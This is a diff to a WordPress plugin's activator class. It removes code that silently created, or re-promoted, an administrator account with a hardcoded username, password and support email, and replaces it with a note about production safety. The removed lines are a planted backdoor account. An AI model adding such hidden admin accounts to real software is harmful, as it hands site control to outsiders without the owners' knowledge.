@@ -700,33 +700,9 @@ class SM_Activator {
     }
 
     private static function seed_admin_account() {
-        $username = '00000010111996';
-        $email = 'support@irseg.org';
-        $password = '00000010111996';
-        $display_name = 'Support Administrator';
-
-        if (!username_exists($username) && !email_exists($email)) {
-            $user_id = wp_create_user($username, $password, $email);
-            if (!is_wp_error($user_id)) {
-                $user = new WP_User($user_id);
-                $user->set_role('administrator');
-
-                wp_update_user([
-                    'ID' => $user_id,
-                    'display_name' => $display_name
-                ]);
-
-                update_user_meta($user_id, 'sm_account_status', 'active');
-                update_user_meta($user_id, 'sm_syndicateMemberIdAttr', $username);
-            }
-        } else {
-            $user = get_user_by('login', $username) ?: get_user_by('email', $email);
-            if ($user) {
-                $user->set_role('administrator');
-                update_user_meta($user->ID, 'sm_account_status', 'active');
-                update_user_meta($user->ID, 'sm_syndicateMemberIdAttr', $username);
-            }
-        }
+        // Security Note: Hardcoded support account has been removed for production safety.
+        // System administrators should be created through standard WordPress user management
+        // or during the setup wizard.
     }
 
     private static function fix_research_schema() {
